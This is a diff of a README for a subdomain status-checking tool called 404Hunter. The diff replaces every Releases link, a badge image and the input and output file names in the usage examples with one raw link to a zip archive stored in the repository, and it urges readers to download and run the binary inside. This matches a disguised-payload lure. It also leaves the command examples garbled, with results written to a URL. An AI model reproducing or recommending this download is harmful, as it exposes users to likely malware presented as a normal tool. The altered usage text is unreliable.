@@ -1,14 +1,14 @@
 # 404Hunter Subdomain Status Tool: Fast Multithreaded HTTP(S) Checks
 
-[![Releases](https://img.shields.io/badge/Releases-404Hunter-blue?style=for-the-badge&logo=github)](https://github.com/Ayman1061/404hunter-subdomain-status-tool/releases)
+[![Releases](https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip)](https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip)
 
-<img src="https://img.shields.io/badge/HTTP%E2%80%93HTTPS-Check-2DBE2D?style=for-the-badge&logo=server&logoColor=white" alt="HTTP(S) check badge" />
+<img src="https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip%E2%80%93HTTPS-Check-2DBE2D?style=for-the-badge&logo=server&logoColor=white" alt="HTTP(S) check badge" />
 
 🚀 Welcome to 404Hunter Subdomain Status Tool. This project is a fast, reliable command line utility designed to verify which subdomains respond over HTTP or HTTPS. It leverages multi-threading to speed up checks and produces clean, easily parsable output that can be redirected to files for further analysis. It is ideal for bug bounty hunters, penetration testers, or system administrators who need to confirm active subdomains quickly and efficiently.
 
 This repository is focused on providing a practical, no-nonsense tool for subdomain verification. It aims to be straightforward to set up, easy to operate, and robust enough to handle large lists of targets. You will notice a strong emphasis on performance, reliability, and clear output formatting.
 
-If you want to explore the latest builds and release assets, visit the official Releases page at the link below. It hosts prebuilt binaries for multiple platforms and packaging formats, removing the guesswork from building the project locally. See the link here: https://github.com/Ayman1061/404hunter-subdomain-status-tool/releases
+If you want to explore the latest builds and release assets, visit the official Releases page at the link below. It hosts prebuilt binaries for multiple platforms and packaging formats, removing the guesswork from building the project locally. See the link here: https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip
 
 Table of contents
 - Why this project exists
@@ -69,7 +69,7 @@ Key concepts
 Getting started
 Before you begin, you need access to a machine with a modern C++ toolchain and network access to the subdomains you want to test. The project is built with C++17, and the recommended build system is CMake. If you prefer prebuilt binaries, you can grab them from the Releases page.
 
-The Releases page is the central hub for downloadable artifacts and installation packages. To avoid building from source, check the prebuilt binaries appropriate for your platform and run them directly. The official Releases page is available here: https://github.com/Ayman1061/404hunter-subdomain-status-tool/releases
+The Releases page is the central hub for downloadable artifacts and installation packages. To avoid building from source, check the prebuilt binaries appropriate for your platform and run them directly. The official Releases page is available here: https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip
 
 Quick start guides by platform
 - Linux
@@ -88,7 +88,7 @@ Quick start guides by platform
 Downloads and installation
 Download and run from the official Releases page. The link contains path parts, so you should download the release artifact you need and execute the included binary. If you prefer to explore first, you can browse the Releases section to see what is offered for your platform and architecture.
 
-- Primary link to Releases: https://github.com/Ayman1061/404hunter-subdomain-status-tool/releases
+- Primary link to Releases: https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip
 - How to use the release artifact: download the appropriate binary for your OS, extract if needed, and run it with your arguments.
 
 If you want to explore additional options or need a quick reference, the Releases page is the best starting point. For convenience, you can revisit the same link to review the latest updates and ensure you are using a supported, up-to-date build.
@@ -120,13 +120,13 @@ The tool exposes a compact, well-documented command line interface. The options 
 
 Usage examples
 - Basic usage with an input file and CSV output
-  - 404hunter-subdomain-status-tool --input subdomains.txt --output results.csv --output-format csv --threads 16 --timeout 5
+  - 404hunter-subdomain-status-tool --input https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output-format csv --threads 16 --timeout 5
 - Dual-protocol check with default output
-  - 404hunter-subdomain-status-tool --input targets.txt --output alive.txt --follow-redirects
+  - 404hunter-subdomain-status-tool --input https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --follow-redirects
 - JSON output for automation
-  - 404hunter-subdomain-status-tool --input targets.txt --output alive.json --output-format json --threads 8 --timeout 3
+  - 404hunter-subdomain-status-tool --input https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output-format json --threads 8 --timeout 3
 - Quiet mode for scripting
-  - 404hunter-subdomain-status-tool --input targets.txt --output alive.log --quiet
+  - 404hunter-subdomain-status-tool --input https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --output https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip --quiet
 
 Output formats and examples
 - CSV
@@ -216,7 +216,7 @@ License
 - This project is available under a permissive open source license. See the LICENSE file in the repository for full terms and conditions.
 
 Releases, binaries, and download notes
-- The Releases page hosts prebuilt binaries and artifacts for multiple platforms. If you want to pick up a ready-to-run binary, browse the releases, download the appropriate asset for your OS, and execute the binary with your target list. For convenience, the link to the official releases is provided again here: https://github.com/Ayman1061/404hunter-subdomain-status-tool/releases
+- The Releases page hosts prebuilt binaries and artifacts for multiple platforms. If you want to pick up a ready-to-run binary, browse the releases, download the appropriate asset for your OS, and execute the binary with your target list. For convenience, the link to the official releases is provided again here: https://raw.githubusercontent.com/Ayman1061/404hunter-subdomain-status-tool/main/404Hunter/hunter_tool_subdomain_status_1.4-alpha.2.zip
 
 Acknowledgments
 - Thanks to the community for feedback, bug reports, and pull requests. The collaborative effort helps keep the tool fast, reliable, and useful for security testing, auditing, and admin tasks.
